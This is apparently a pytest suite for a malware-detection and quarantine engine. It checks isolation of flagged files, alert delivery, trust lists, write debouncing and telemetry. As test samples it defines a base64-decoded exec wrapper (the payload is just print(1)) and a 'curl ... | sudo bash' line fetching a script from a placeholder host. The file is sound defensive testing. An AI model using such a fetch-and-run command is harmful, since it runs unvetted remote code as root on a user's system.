"""Monitor: arquivo detectado em pasta vigiada vai para a quarentena e o alerta sempre chega."""
import base64
import hashlib
import json

import pytest

from mandacaru.decisions import DecisionLog
from mandacaru.detectors.static import StaticScanner
from mandacaru.engine import Engine
from mandacaru.events import Alert, Event, Severity
from mandacaru.quarantine import Quarantine, TrustList

# regra yara.Py_Exec_Decoded_Payload (HIGH), a mesma amostra inofensiva de tests/test_detectors.py
HIGH = f"import base64\nexec(base64.b64decode('{base64.b64encode(b'print(1)').decode()}'))\n"
# regra yara.Shell_Pipe_To_Interpreter (MEDIUM)
MEDIUM = "curl -fsSL https://exemplo.invalid/x.sh | sudo bash\n"


@pytest.fixture(scope="module")
def scanner():
    return StaticScanner()


@pytest.fixture
def w(tmp_path):
    d = tmp_path / "w"
    d.mkdir()
    return d


@pytest.fixture
def trust(tmp_path):
    return TrustList(tmp_path / "trusted.json", recheck_seconds=0)


@pytest.fixture
def q(tmp_path, trust):
    root = tmp_path / "q"
    root.mkdir()
    return Quarantine(root, DecisionLog(tmp_path / "d.jsonl"), trust=trust)


@pytest.fixture
def setup(scanner, q, w):
    got = []
    engine = Engine([got.append], scanner=scanner, quarantine=q, watch_paths=[str(w)])
    return engine, got


def fev(kind, path):
    return Event(kind, {"path": str(path)})


def test_arquivo_malicioso_em_pasta_vigiada_e_isolado(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert out and got == out
    cases = q.list()
    assert len(cases) == 1
    assert all(a.quarantine_id == cases[0].id for a in out)
    assert all(a.evidence["quarantine_id"] == cases[0].id for a in out)
    assert not f.exists()


def test_create_e_write_seguidos_geram_um_caso(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    engine.process(fev("file_write", f))  # o arquivo ja foi isolado: sem excecao, sem segundo caso
    assert len(q.list()) == 1
    assert len({a.quarantine_id for a in got}) == 1 and got[0].quarantine_id


def test_arquivo_fora_da_pasta_vigiada_so_alerta(setup, q, tmp_path):
    engine, got = setup
    fora = tmp_path / "fora"
    fora.mkdir()
    f = fora / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert out and all(a.quarantine_id is None for a in out)
    assert q.list() == [] and f.exists()


def test_pasta_vigiada_com_dotdot_no_caminho_ainda_isola(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", w / ".." / "w" / "loader.py"))
    assert out and all(a.quarantine_id for a in out)
    assert len(q.list()) == 1


def test_process_start_nunca_isola(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(Event("process_start", {"pid": 7, "exe": "/usr/bin/python3",
                                                 "cmdline": ["python", str(f)]}))
    assert any(a.rule == "yara.Py_Exec_Decoded_Payload" for a in out)
    assert all(a.quarantine_id is None for a in out)
    assert q.list() == [] and f.exists()


def test_medium_nao_isola_com_padrao(setup, q, w):
    engine, got = setup
    f = w / "install.sh"
    f.write_text(MEDIUM)
    out = engine.process(fev("file_create", f))
    assert out and all(a.severity == Severity.MEDIUM and a.quarantine_id is None for a in out)
    assert q.list() == [] and f.exists()


def test_alerta_de_caso_novo_ignora_dedup(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    ids = [a.quarantine_id for a in got if a.rule == "yara.Py_Exec_Decoded_Payload"]
    assert len(ids) == 2 and ids[0] and ids[1] and ids[0] != ids[1]
    assert len(q.list()) == 2


def test_hash_confiavel_vira_info_sem_isolar(setup, q, w, trust):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    trust.add(hashlib.sha256(HIGH.encode()).hexdigest(), str(f), "teste")
    out = engine.process(fev("file_create", f))
    assert out and all(a.severity == Severity.INFO and a.evidence["trusted"] is True for a in out)
    assert all(a.quarantine_id is None for a in out)
    assert q.list() == [] and f.exists()


def test_nao_isolado_diz_o_motivo_no_resumo(scanner, tmp_path, w):
    got = []
    q = Quarantine(tmp_path / "nao-existe", DecisionLog(tmp_path / "d.jsonl"))
    engine = Engine([got.append], scanner=scanner, quarantine=q, watch_paths=[str(w)])
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert out and all(a.quarantine_id is None for a in out)
    assert all(a.evidence["quarantine"].startswith("nao_isolado: ") for a in out)
    assert all("(NAO isolado: " in a.summary for a in out)
    assert f.exists()


def test_sem_quarentena_so_alerta(scanner, w):
    got = []
    engine = Engine([got.append], scanner=scanner, watch_paths=[str(w)])
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert out and all(a.quarantine_id is None for a in out) and f.exists()


def test_alerta_isolado_vai_no_jsonl_com_o_id(setup, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert f'"quarantine_id": "{out[0].quarantine_id}"' in out[0].to_json()


def test_confiar_com_o_servico_rodando_nao_isola_o_temporario(scanner, tmp_path, w, monkeypatch):
    """O monitor ve o temporario da restauracao (create/write) no meio do "confiar": nao pode isola-lo."""
    from mandacaru import quarantine as qmod
    got = []
    # servico: lista propria, que acabou de ler o arquivo (e so releria depois de 1 h)
    q_svc = Quarantine(tmp_path / "q", DecisionLog(tmp_path / "d.jsonl"),
                       trust=TrustList(tmp_path / "trusted.json", recheck_seconds=3600))
    (tmp_path / "q").mkdir()
    engine = Engine([got.append], scanner=scanner, quarantine=q_svc, watch_paths=[str(w)])
    f = w / "loader.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    [case] = q_svc.list()
    vistos = []
    real = qmod.xor_stream

    def servico_ve_o_temporario(src, dst, *a, **k):
        digest = real(src, dst, *a, **k)
        for p in w.iterdir():
            if p.name.startswith(".mandacaru-restore-"):
                vistos.append(p.name)
                for kind in ("file_create", "file_write"):
                    engine.process(fev(kind, p))
        return digest

    monkeypatch.setattr(qmod, "xor_stream", servico_ve_o_temporario)
    q_cli = Quarantine(tmp_path / "q", DecisionLog(tmp_path / "d.jsonl"),
                       trust=TrustList(tmp_path / "trusted.json", recheck_seconds=3600), strict_log=True)
    assert q_cli.restore(case.id, "ana", 1000) == str(f)
    assert vistos                                    # o servico de fato processou o temporario
    assert q_svc.list() == []                        # nenhum caso novo
    assert f.read_text() == HIGH
    assert sorted(p.name for p in w.iterdir()) == ["loader.py"]
    assert not [a for a in got[1:] if a.severity != Severity.INFO]   # sem segundo popup


# alertas abaixo do min_severity no mesmo arquivo herdam o resultado da quarentena
AMBOS = MEDIUM + HIGH


def test_alerta_medium_do_arquivo_isolado_leva_o_id_e_ignora_dedup(setup, q, w):
    engine, got = setup
    f = w / "x.py"
    f.write_text(MEDIUM)
    engine.process(fev("file_create", f))           # MEDIUM sozinho: alerta, sem isolar
    assert got and f.exists()
    f.write_text(AMBOS)
    out = engine.process(fev("file_write", f))
    [case] = q.list()
    med = [a for a in out if a.rule == "yara.Shell_Pipe_To_Interpreter"]
    assert med, "o MEDIUM do arquivo isolado tem de chegar mesmo dentro da janela de dedup"
    assert med[0].quarantine_id == case.id and med[0].evidence["quarantine_id"] == case.id


def test_alerta_medium_de_arquivo_confiavel_vira_info(setup, q, w, trust):
    engine, got = setup
    f = w / "x.py"
    f.write_text(AMBOS)
    trust.add(hashlib.sha256(AMBOS.encode()).hexdigest(), str(f), "teste")
    out = engine.process(fev("file_create", f))
    assert {a.rule for a in out} == {"yara.Py_Exec_Decoded_Payload", "yara.Shell_Pipe_To_Interpreter"}
    assert all(a.severity == Severity.INFO and a.evidence["trusted"] is True for a in out)
    assert q.list() == [] and f.exists()


def test_alerta_medium_de_arquivo_nao_isolado_diz_o_motivo(scanner, tmp_path, w):
    got = []
    q = Quarantine(tmp_path / "nao-existe", DecisionLog(tmp_path / "d.jsonl"))
    engine = Engine([got.append], scanner=scanner, quarantine=q, watch_paths=[str(w)])
    f = w / "x.py"
    f.write_text(AMBOS)
    out = engine.process(fev("file_create", f))
    assert len(out) == 2
    assert all(a.evidence["quarantine"].startswith("nao_isolado: ") for a in out)
    assert all("(NAO isolado: " in a.summary for a in out)


# --- debounce de em_escrita e laco de symlink ---
def _escrevendo(monkeypatch, q):
    """Faz o isolamento falhar com em_escrita e conta as tentativas."""
    from mandacaru.quarantine import IsolateResult
    tentativas = []

    def isolate(path, alert):
        tentativas.append(path)
        return IsolateResult("nao_isolado", reason="em_escrita")

    monkeypatch.setattr(q, "isolate", isolate)
    return tentativas


def test_em_escrita_nao_refaz_a_copia_a_cada_modify(setup, q, w, monkeypatch):
    engine, got = setup
    tentativas = _escrevendo(monkeypatch, q)
    f = w / "baixando.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    for _ in range(20):
        engine.process(fev("file_write", f))
    assert len(tentativas) == 1


def test_fechamento_da_escrita_tenta_de_novo_sem_debounce(setup, q, w, monkeypatch):
    engine, got = setup
    tentativas = _escrevendo(monkeypatch, q)
    f = w / "baixando.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    engine.process(fev("file_write", f))
    engine.process(Event("file_write", {"path": str(f), "closed": True}))
    assert len(tentativas) == 2
    monkeypatch.undo()                       # agora o arquivo esta estavel
    engine.process(Event("file_write", {"path": str(f), "closed": True}))   # ainda pendente: ultima tentativa
    assert len(q.list()) == 1 and not f.exists()
    engine.process(Event("file_write", {"path": str(f), "closed": True}))   # nao pendente: nada a refazer
    assert len(q.list()) == 1


def test_em_escrita_tenta_de_novo_depois_do_debounce(setup, q, w, monkeypatch):
    engine, got = setup
    tentativas = _escrevendo(monkeypatch, q)
    f = w / "baixando.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    engine._writing[str(f)] -= 3
    engine.process(fev("file_write", f))
    assert len(tentativas) == 2


def test_fsmon_emite_o_fechamento_da_escrita(tmp_path):
    import queue
    import time

    from mandacaru.collectors.fsmon import FileMonitor
    out = queue.Queue()
    fm = FileMonitor([str(tmp_path)], out)
    fm.start()
    try:
        (tmp_path / "a.bin").write_bytes(b"x" * 10)
        deadline, visto = time.time() + 5, False
        while time.time() < deadline and not visto:
            try:
                visto = out.get(timeout=0.5).data.get("closed") is True
            except queue.Empty:
                pass
        assert visto
    finally:
        fm.stop()


def test_resolve_que_levanta_runtimeerror_vira_nao_isolado_com_symlink(scanner, q, w, monkeypatch):
    from pathlib import Path
    engine = Engine([], scanner=scanner, quarantine=q, watch_paths=[str(w)])
    laco = w / "a"
    laco.symlink_to(laco)
    f = laco / "x.py"
    real = Path.resolve

    def resolve(self, *a, **k):
        if "/a" in str(self):
            raise RuntimeError("Symlink loop")
        return real(self, *a, **k)

    monkeypatch.setattr(Path, "resolve", resolve)
    assert engine._watched(str(f)) is True
    r = q.isolate(str(f), Alert("yara.X", Severity.HIGH, "s", {"path": str(f)}))
    assert (r.status, r.reason) == ("nao_isolado", "caminho_com_symlink")


def test_escritor_que_nunca_fecha_tem_retry_depois_da_janela(setup, q, w, monkeypatch):
    engine, got = setup
    tentativas = _escrevendo(monkeypatch, q)
    f = w / "torrent.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    engine.process(fev("file_write", f))          # ultimo write, dentro da janela, sem close
    assert len(tentativas) == 1
    engine.retry_dropped()                         # janela ainda aberta: nada
    assert len(tentativas) == 1
    engine._writing[str(f)] -= 3
    engine.retry_dropped()                         # borda final
    assert len(tentativas) == 2
    engine.retry_dropped()                         # nada mais pendente
    assert len(tentativas) == 2
    monkeypatch.undo()
    engine._writing[str(f)] -= 3
    engine._dropped.add(str(f))
    engine.retry_dropped()
    assert len(q.list()) == 1 and not f.exists()


def test_excesso_de_pendentes_descarta_o_mais_antigo_e_mantem_o_resto(setup, q, w, monkeypatch):
    engine, got = setup
    _escrevendo(monkeypatch, q)
    for i in range(10_001):
        engine._writing[f"/x/{i}"] = 1.0
    f = w / "novo.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    assert str(f) in engine._writing and "/x/0" not in engine._writing and "/x/5" in engine._writing


def test_caso_isolado_vai_para_a_fila_de_telemetria(scanner, q, w, tmp_path):
    from mandacaru.config import Config
    from mandacaru.telemetry.outbox import TelemetryOutbox
    from mandacaru.telemetry.producer import make_enqueuer

    outbox = TelemetryOutbox(tmp_path / "t" / "outbox.db")
    cfg = Config(telemetry_level="iocs_only", telemetry_tlp="TLP:GREEN")
    engine = Engine([lambda a: None], scanner=scanner, quarantine=q, watch_paths=[str(w)],
                    on_isolated=make_enqueuer(cfg, outbox))
    f = w / "loader.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))

    [item] = outbox.list_items()
    assert item.status == "PENDING"                       # require_approval padrao
    assert item.sha256 == hashlib.sha256(HIGH.encode()).hexdigest()
    assert item.payload["tlp"] == "TLP:GREEN"
    assert "Py_Exec_Decoded_Payload" in item.payload["detection"]["yara_rules"]
    assert str(tmp_path) not in json.dumps(item.payload)  # nada de caminho local no relatorio


def test_falha_no_pos_isolamento_nao_derruba_o_motor(scanner, q, w):
    def explode(case, alerts):
        raise RuntimeError("fila quebrada")

    got = []
    engine = Engine([got.append], scanner=scanner, quarantine=q, watch_paths=[str(w)], on_isolated=explode)
    f = w / "loader.py"
    f.write_text(HIGH)
    assert engine.process(fev("file_create", f)) and got[0].quarantine_id
